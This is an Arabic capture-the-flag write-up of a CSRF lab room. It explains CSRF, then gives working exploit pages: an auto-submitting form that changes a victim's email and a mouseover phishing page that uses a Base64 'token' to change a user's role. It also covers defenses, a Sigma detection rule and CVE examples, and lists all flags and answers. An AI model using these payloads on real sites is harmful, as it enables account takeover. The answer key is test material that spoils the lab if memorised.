# التوثيق الشامل: مقدمة في تزوير الطلبات عبر المواقع (CSRF Introduction)

---

## القسم 01: نظرة عامة وبيانات وصفية (Room Overview & Metadata)

| البند (Item) | التفاصيل والمواصفات التقنية (Technical Specification) |
| :--- | :--- |
| **اسم الغرفة (Room Title)** | CSRF Introduction (مقدمة في تزوير الطلبات عبر المواقع) |
| **المسار التعليمي (Path)** | Jr Penetration Tester (المستوى الوظيفي لمختبر الاختراق المبتدئ - معتمد PT1) |
| **الوحدة التعليمية (Module)** | Web Application Vulnerabilities I (الوحدة 07: ثغرات تطبيقات الويب 1) |
| **معرف الغرفة (Room Slug)** | `csrfintroduction` (الرابط التاريخي: `/room/csrf`) |
| **مستوى الصعوبة (Difficulty)** | سهل (Easy) |
| **نوع الغرفة (Room Type)** | إرشادية وتطبيقية (Walkthrough & Practical Lab) |
| **الوقت التقديري للإنجاز (Est. Completion Time)** | 60 دقيقة |
| **إجمالي عدد المهام (Total Tasks)** | 8 مهام تفاعلية (8 Tasks) |
| **التطبيق المستهدف (Target App)** | بوابة الموظفين الداخلية StaffHub (`http://staffhub.thm:8080`) |
| **حالة إنجاز الحساب (Completion Status)** | 100% مكتمل (تم التحقق والمطابقة التامة مع حساب المنصة) |

---

## القسم 02: الأهداف التعليمية والعملياتية (Educational & Operational Objectives)

1. **الاستيعاب النظري لمعضلة النائب المشوش (Confused Deputy Problem):** فهم الكيفية التي يستغل بها المهاجم سلوك متصفح الويب في إرفاق ملفات تعريف الارتباط التلقائية (Ambient Authority) لإجبار الضحية على إرسال طلبات غير مقصودة.
2. **فهم الشروط الجوهرية لثغرة CSRF:** إدراك ضرورة وجود إجراء يغير حالة الخادم (`State-changing action`) مع الاعتماد الكلي على الكوكيز لإدارة الجلسة وغياب الرموز العشوائية (`Anti-CSRF Tokens`).
3. **دحض المغالطات الهندسية الشائعة:** إثبات أن استخدام طريقة `POST` بدلاً من `GET` لا يشكل أي حماية من هجمات CSRF.
4. **بناء نماذج الاستغلال التلقائي (Automated Exploit Pages):** برمجة صفحات HTML مستقلة تحتوي على نماذج خبيثة تعمل بتقنية الإرسال التلقائي عبر JavaScript (`form.submit()`).
5. **استغلال الرموز الضعيفة والقابلة للتنبؤ (Weak Tokens Exploitation):** كسر وفك تشفير الرموز المولدة بخوارزميات غير عشوائية مثل ترميز Base64 واستغلال طلبات `GET` الحساسة.
6. **تطبيق الاستراتيجيات الدفاعية المتكاملة:** تطبيق نموذج الرمز المتزامن (Synchronizer Token Pattern)، وسمات الكوكيز المتقدمة `SameSite`، ومتطلبات إعادة المصادقة (Re-authentication).

---

## القسم 03: البنية المعمارية وتخطيط الشبكة (Target Architecture & Network Topology)

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                                    BILINGUAL NETWORK TOPOLOGY                           |
|                                                                                         |
|                 +───────────────────────────────────────────────────+                   |
|                 |                   Victim User                     |                   |
|                 |          (Authenticated Employee Browser)         |                   |
|                 +───────────────────────────────────────────────────+                   |
|                                     │           ▲                                       |
|        1. Genuine Session / Cookies │           │ 3. Social Engineering Visit           |
|                                     ▼           │    (Loads Exploit Page)               |
|  +─────────────────────────────────────+     +───────────────────────────────────────+  |
|  |     Target Application Server       |     |         Attacker Infrastructure       |  |
|  |             (StaffHub)              |     |          (AttackBox / Evil Web)       |  |
|  |─────────────────────────────────────|     |───────────────────────────────────────|  |
|  | IP: 10.10.X.Y (staffhub.thm:8080)   |     | IP: 10.10.A.B (Port 81)               |  |
|  | Web Stack: Apache / PHP 7.4         |     | Web Stack: Python / Apache2           |  |
|  | Cookie: PHPSESSID (No SameSite)     |     | Hosted: settings.html & role.html     |  |
|  | Endpoints:                          |     |                                       |  |
|  |  - /update_email.php (POST)         |     |                                       |  |
|  |  - /update_role.php (GET, Weak)     |     |                                       |  |
|  +─────────────────────────────────────+     +───────────────────────────────────────+  |
|                                     ▲                                                   |
|                                     │ 4. Forged Cross-Site Request                      |
|                                     │    (Carries Victim's PHPSESSID!)                  |
|                                     └───────────────────────────────────────────────────┘
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## القسم 04: المتطلبات الأساسية وإعداد البيئة (Prerequisites & Environment Setup)

### 1. المتطلبات المعرفية (Knowledge Prerequisites):
- فهم أساسيات بروتوكول HTTP (الهيدرز، طرق `GET` و `POST`، بنية الكوكيز).
- الإلمام بآلية عمل متصفحات الويب وسياسة الأصل المشترك (Same-Origin Policy - SOP).
- أساسيات لغة HTML ونماذج الإدخال وأكواد JavaScript البسيطة لمعالجة الـ DOM.

### 2. إعداد الاتصال والشبكة (Networking & Host Configuration):
يتم ربط النطاق الداخلي `staffhub.thm` بعنوان الآي بي المخصص للمختبر في ملف `/etc/hosts`:
```bash
# إضافة الدومين إلى ملف hosts المحلي أو على AttackBox
echo "10.10.X.Y staffhub.thm" | sudo tee -a /etc/hosts

# التحقق من استجابة خادم الويب على المنفذ 8080
curl -I -s http://staffhub.thm:8080/login.php | head -n 5
```

---

## القسم 05: التحليل النظري والعمق المفاهيمي (Theoretical Deep Dive)

### أ. ما هو هجوم تزوير الطلبات عبر المواقع (CSRF)؟
هجوم CSRF (المعروف أيضاً بهجوم "نقرة واحدة" أو "الركوب على الجلسة - Session Riding") هو تقنية تسمح للمهاجم باستغلال الجلسة المصادق عليها لمستخدم شرعي على تطبيق ويب، وإجباره على إرسال طلبات خبيثة تغير حالته في النظام دون علمه أو موافقته.

### ب. كيف يحدث الهجوم؟ (ميكانيكية عمل المتصفح)
1. يسجل المستخدم دخوله لموقع `staffhub.thm` ويحصل على كوكي جلسة `PHPSESSID`.
2. يغري المهاجم المستخدم بزيارة موقع ضار تحت سيطرته (`attacker.thm/page.html`).
3. تحتوي الصفحة الضارة على نموذج مخفي موجه إلى `staffhub.thm/update_email.php`.
4. عند فتح الصفحة، يُرسل المتصفح الطلب تلقائياً، وبما أن الوجهة هي `staffhub.thm`، يرفق المتصفح تلقائياً كوكي الجلسة `PHPSESSID`.
5. يستقبل الخادم الطلب مصحوباً ببيانات الاعتماد الشرعية وينفذ العملية دون أن يدرك أن الطلب صادر من نطاق خارجي.

### ج. الشروط الثلاثة الواجب توفرها لنجاح الهجوم:
1. **وجود إجراء حساس يحدث تغييراً في الحالة (`State-changing Action`):** مثل تعديل البريد، تغيير كلمة المرور، تحويل أموال. الهجمات لا تنجح على استعراض البيانات فقط بسبب حظر الـ SOP لقراءة الرد.
2. **الاعتماد الكلي على الكوكيز لإدارة الجلسة (`Cookie-based Session Handling`):** عدم طلب إعادة إدخال كلمة المرور أو استخدام آليات مصادقة متعددة.
3. **غياب المعاملات غير القابلة للتنبؤ (`No Unpredictable Parameters`):** عدم وجود رموز حماية عشوائية سرية (`CSRF Tokens`).

---

## القسم 06: الاستطلاع ورسم خريطة سطح الهجوم (Reconnaissance & Attack Surface)

عند فحص تطبيق **StaffHub** (`http://staffhub.thm:8080`) بعد تسجيل الدخول ببيانات الاعتماد (`user` / `user`):

### 1. فحص نموذج تعديل البريد الإلكتروني (`settings.php`):
```html
<form action="update_email.php" method="POST">
    <div class="input-field">
        <input id="email" type="email" name="email" required>
        <label for="email">New Email Address</label>
    </div>
    <button type="submit">Update Email</button>
</form>
```
- **الملاحظة الأمنية:** النموذج يطلب طريقة `POST`، ولكنه يفتقر تماماً لأي حقل رمزي خفي (`csrf_token`)، كما أن الكوكي يفتقر لسمة `SameSite`.

### 2. فحص نموذج ترقية وتعديل الرتبة (`settings.php`):
```html
<form action="update_role.php" method="GET">
    <input type="hidden" name="csrf_token" value="YWRtaW4=">
    <input type="hidden" name="role" value="staff">
    <button type="submit">Update Role</button>
</form>
```
- **الملاحظة الأمنية:** النموذج يستخدم طريقة `GET` الخطيرة لتغيير الرتبة، ويحتوي على رمز رمزي `YWRtaW4=`.

---

## القسم 07: تفكيك السبب الجذري للثغرة (Vulnerability Root Cause Analysis)

### 1. في نموذج البريد الإلكتروني (`update_email.php`):
- **السبب الجذري:** غياب تطبيق "نموذج الرمز المتزامن" (Synchronizer Token Pattern). يعتمد الكود المصدري الخلفي على التحقق من `$_SESSION['user_id']` و `$_POST['email']` فقط:
```php
<?php
session_start();
if (!isset($_SESSION['user_id'])) { die("Access Denied"); }
$new_email = $_POST['email'];
// تحديث قاعدة البيانات مباشرة دون التحقق من مصدر الطلب أو وجود Token
update_email_in_db($_SESSION['user_id'], $new_email);
?>
```

### 2. في نموذج الرتبة (`update_role.php`):
- **السبب الجذري:** الخلط القاتل بين الترميز (Encoding) والتشفير العشوائي (Cryptography).
- الرمز المعطى هو `YWRtaW4=`. وعند تحليله:
  ```bash
  echo -n "YWRtaW4=" | base64 -d
  # النتيجة: admin
  ```
- المطور قام بترميز الرتبة الحالية للمستخدم عبر خوارزمية Base64 واستخدمها كرمز حماية، وهو ما يجعله متوقعاً وثابتاً ومعلوماً للمهاجم مسبقاً!

---

## القسم 08: الاستغلال العملي واستخراج الأعلام (Step-by-Step Exploitation)

### السيناريو 1: استغلال نموذج HTML لتغيير البريد الإلكتروني (المهمة 05)

1. إنشاء ملف الاستغلال الخبيث في مسار خادم الويب على جهاز المهاجم (`/var/www/html/settings.html`):
```html
<!DOCTYPE html>
<html>
<head>
    <title>Employee Portal Rewards</title>
</head>
<body>
    <h2>جاري التحقق من هوية الموظف... يرجى الانتظار</h2>
    <!-- نموذج CSRF الخبيث -->
    <form id="attackForm" action="http://staffhub.thm:8080/update_email.php" method="POST">
        <input type="hidden" name="email" value="attacker@evilmail.thm" />
    </form>
    <script>
        // إرسال النموذج تلقائياً عند تحميل الصفحة
        document.getElementById('attackForm').submit();
        // إعادة توجيه الضحية إلى صفحة الإعدادات الأصلية لإخفاء الأثر
        setTimeout(function() {
            window.location.href = "http://staffhub.thm:8080/settings.php";
        }, 1000);
    </script>
</body>
</html>
```

2. تشغيل خادم الويب والوصول إلى الرابط عبر جلسة المستخدم الضحية:
   - الرابط: `http://10.10.A.B:81/settings.html`
   - يقوم المتصفح بإرسال طلب `POST` محملاً بكوكيز الضحية.
   - تظهر رسالة النجاح في تطبيق StaffHub متضمنة العلم الأول:
     > **العلم 1:** `THM{Got_The_Evil_Email001}`

3. تعديل قيمة البريد في الملف إلى `special@evilmail.thm`:
   ```bash
   sed -i 's/attacker@evilmail.thm/special@evilmail.thm/g' /var/www/html/settings.html
   ```
4. إعادة فتح الصفحة في متصفح الضحية لاستخراج العلم الثاني:
   > **العلم 2:** `THM{My_Special_Email007}`

---

### السيناريو 2: استغلال الرموز الضعيفة وتنزيل الرتبة عبر حدث الماوس (المهمة 06)

1. كسر الرمز عبر سطر الأوامر:
   ```bash
   echo -n "YWRtaW4=" | base64 -d  # الناتج: admin
   ```
2. بما أن العملية تقبل طلبات `GET` وتطلب الرمز الثابت `YWRtaW4=`، يمكن للمهاجم إجبار المتصفح على زيارة الرابط:
   ```
   http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4=
   ```
3. إنشاء صفحة تصيد هندسة اجتماعية (`/var/www/html/role.html`) تعتمد على حدث تحريك الفأرة (`onmouseover`):
```html
<!DOCTYPE html>
<html>
<head>
    <title>إشعار إداري داخلي</title>
</head>
<body>
    <h2>إشعار هام لجميع موظفي الشركة</h2>
    <p>يرجى تمرير مؤشر الفأرة فوق الصورة أدناه لتأكيد قراءة اللائحة الجديدة:</p>
    <img src="http://staffhub.thm:8080/one.png"
         width="400"
         onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='">
</body>
</html>
```
4. عند تمرير الفأرة فوق الصورة في متصفح الضحية المصادق، يتوجه المتصفح فورياً للرابط، وتُخفض رتبة المستخدم إلى `staff`.
5. بالدخول إلى لوحة التحكم الرئيسية (`http://staffhub.thm:8080/dashboard.php`)، يتم استخراج العلم الثالث:
   > **العلم 3:** `THM{Weak_CSRF_Role_001}`

---

## القسم 09: استراتيجيات الدفاع متعدد الطبقات (Defense-in-Depth & Hardening)

لتحصين تطبيقات الويب ضد ثغرات CSRF بشكل قاطع، يجب تبني ثلاث طبقات دفاعية متزامنة:

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                           DEFENSE-IN-DEPTH REMEDIATION MODEL                            |
|                                                                                         |
|  [ الطبقة الأولى: رموز الحماية المتزامنة (Anti-CSRF Tokens) ]                           |
|  - توليد قيمة عشوائية تشفيرية عالية الإنتروبيا (CSPRNG 128-bit+).                       |
|  - ربط الرمز بجلسة المستخدم في الخادم ومقارنته باستخدام Constant-Time Compare.           |
|                                                                                         |
|  [ الطبقة الثانية: سمات ملفات تعريف الارتباط الصارمة (SameSite Cookie Flags) ]          |
|  - تعيين سمة `SameSite=Strict` للبوابات الحساسة والمعاملات المصرفية.                    |
|  - تعيين سمة `SameSite=Lax` افتراضياً لمنع إرسال الكوكيز مع طلبات الـ POST الخارجية.     |
|  - إلزام وجود سمة `Secure` و `HttpOnly`.                                                |
|                                                                                         |
|  [ الطبقة الثالثة: التحقق التفاعلي وإعادة المصادقة (Re-Authentication) ]                 |
|  - اشتراط إدخال كلمة المرور الحالية قبل تغيير البريد الإلكتروني أو كلمة المرور.         |
|  - إرسال رمز تحقق مؤقت (OTP / 2FA) قبل الموافقة على تعديل البيانات الحساسة.            |
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## القسم 10: الكشف وصيد التهديدات وقواعد SIEM (Detection & SIEM Rules)

### 1. تحليل سجلات خوادم الويب (Apache/Nginx Log Analysis):
يتم الكشف عن محاولات استغلال CSRF عبر تدقيق ترويسة المصدر (`Referer` و `Origin`) في الطلبات المحدثة للحالة:
```bash
# البحث عن طلبات POST الحساسة الصادرة من مصادر ونطاقات خارجية غير مصرح بها:
grep "POST /update_email.php" /var/log/apache2/access.log | awk '$11 !~ /staffhub\.thm/ {print $0}'
```

### 2. قاعدة كشف بصيغة Sigma Rule:
```yaml
title: Potential CSRF Exploitation via External Referer
id: 8b3c41a2-9f1e-4c7b-a2e4-18c2d9a30b5e
status: experimental
description: Detects state-changing HTTP POST requests containing an external or anomalous Referer domain.
logsource:
  category: webserver
detection:
  selection:
    cs-method: 'POST'
    cs-uri-stem:
      - '/update_email.php'
      - '/update_role.php'
      - '/change_password.php'
  filter_legitimate:
    cs-referer|contains: 'staffhub.thm'
  condition: selection and not filter_legitimate
fields:
  - c-ip
  - cs-method
  - cs-uri-stem
  - cs-referer
falsepositives:
  - Third-party SSO providers during callback handshakes
level: high
```

---

## القسم 11: الأخطاء الشائعة واستكشاف المشكلات وإصلاحها (Troubleshooting)

1. **الاعتقاد بأن الاعتماد على طريقة `POST` كافٍ للحماية:**
   - *الخطأ:* ظن المطورين أن طلبات `POST` لا يمكن تزويرها خارج المتصفح.
   - *الحل:* أثبتت التجربة في المهمة 05 أن نماذج HTML القياسية تستطيع إرسال طلبات `POST` لأي نطاق خارجي مرفقة بالكوكيز دون أي قيود ما لم تُحمَ بـ Tokens أو SameSite.
2. **استخدام خوارزميات ترميز قابلة للفك كرموز حماية:**
   - *الخطأ:* تحويل اسم المستخدم أو الرتبة إلى Base64 أو MD5 ثابت واستخدامه كـ `csrf_token`.
   - *الحل:* استخدام دوال توليد التشفير الآمنة (مثل `random_bytes(32)` في PHP أو `secrets.token_hex(32)` في بايثون).
3. **تطبيق إجراءات حساسة ومحدثة للحالة عبر طريقة `GET`:**
   - *الخطأ:* استقبال معاملات تغيير الرتبة في الرابط (`update_role.php?role=staff`).
   - *الحل:* حظر استخدام `GET` لتغيير البيانات تطبيقاً لمعايير RFC 7231، وإلزام استخدام `POST/PUT/DELETE`.

---

## القسم 12: دراسات حالة واقعية ومطابقة مع معايير CVE (Case Studies & CVE Mapping)

1. **ثغرة أجهزة التوجيه المنزلية (CVE-2008-2398):**
   - استهدفت ثغرة CSRF راوترات Netgear المنزلية حيث كان المهاجم يضع صورة خفية في منتدى تقني برابط `http://192.168.1.1/setup.cgi?next_file=dns.htm&dns1=attacker_ip`. بمجرد فتح المستخدم للصفحة، يقوم متصفحه بتغيير خوادم DNS في راوتر منزله إلى خوادم المهاجم!
2. **ثغرة ووردبريس في اعتماد التعليقات (WordPress Core Historical CSRF):**
   - تمكن المهاجمون من خداع مديري المواقع لزيارة مقالات تحتوي على روابط تعتمد تعليقات برمجية ضارة تلقائياً نتيجة غياب رموز التحقق في طلبات الموافقة السريعة.
3. **التصنيف المعياري:**
   - **CWE-352:** Cross-Site Request Forgery (CSRF).
   - **OWASP Top 10-2021:** A01:2021 - Broken Access Control.

---

## القسم 13: الملخص العام ومصفوفة الإجابات (Summary & Answers Matrix)

| المهمة (Task) | محور التركيز (Focus Area) | السؤال التقني المعتمد (Verified Question) | الإجابة النهائية (Final Answer) |
| :--- | :--- | :--- | :--- |
| **Task 01** | بيئة التدريب | I have successfully connected to the machine. | `No answer needed` |
| **Task 02** | أساسيات الثقة | Relationship abused by CSRF? | `Trust` |
| | الكوكيز التلقائية | Included automatically after login? | `Cookies` |
| **Task 03** | شروط الهجوم | Type of action required? | `State-changing` |
| **Task 04** | دحض المغالطات | Method incorrectly believed to prevent CSRF? | `POST` |
| | آليات الحماية | Mechanism commonly used to protect? | `CSRF tokens` |
| **Task 05** | استغلال النماذج | Flag after updating email to attacker@evilmail.thm | `THM{Got_The_Evil_Email001}` |
| | التعديل المتقدم | Flag after updating email to special@evilmail.thm | `THM{My_Special_Email007}` |
| **Task 06** | الرموز الضعيفة | Flag after demoting user to staff | `THM{Weak_CSRF_Role_001}` |
| | فك التشفير | Encoding scheme used by developer | `base64` |
| **Task 07** | أفضل الممارسات | I have understood the best practices. | `No answer needed` |
| **Task 08** | الخاتمة | I have successfully completed the room. | `No answer needed` |

---

## القسم 14: تمارين عملية وتوسعات للتحدي (Practical Exercises & Extensions)

1. **تمرين 1: كتابة أداة أوتوماتيكية للتحقق من ثغرات CSRF:**
   - اكتب اسكربت بايثون يقوم بفحص جميع نماذج صفحة ويب معينة واستخراج الـ forms التي لا تحتوي على مدخلات `type="hidden"` تحمل أسماء مرتبطة بـ `csrf` أو `token`.
2. **تمرين 2: محاكاة الهجوم عبر أداة Burp Suite Professional:**
   - استخدم ميزة `Engagement tools -> Generate CSRF PoC` في Burp Suite لإنشاء صفحة استغلال متطورة تدعم أسلوب الـ Auto-submit تلقائياً دون كتابة كود يدوي.
3. **تمرين 3: دراسة التفاعل بين XSS و CSRF:**
   - قم بمحاكاة سيناريو يتم فيه استخدام ثغرة XSS لقراءة قيمة رمز الحماية السري `csrf_token` من الـ DOM وإرسال طلب POST سليم متجاوزاً أقوى دفاعات الـ Synchronizer Token Pattern.
